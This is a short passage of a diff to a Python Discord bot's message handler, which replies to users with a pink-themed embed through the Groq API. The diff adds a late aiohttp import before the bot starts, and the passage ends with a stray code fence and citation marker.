         user_msg = message.content.strip() if message.content else "..."
         
@@ -1012,10 +1496,13 @@ async def on_message(message):
             color=p_info['color']
         )
         embed.set_footer(text="Hệ thống AI màu hồng • Độc quyền phục vụ Boss Tuyền 💖")
+
         await message.reply(embed=embed, mention_author=False)
 
     except Exception as e:
         print(f"[GROQ API ERROR]: {e}")
 
 if __name__ == "__main__":
+    import aiohttp
     bot.run(DISCORD_TOKEN)
+```[cite: 6]
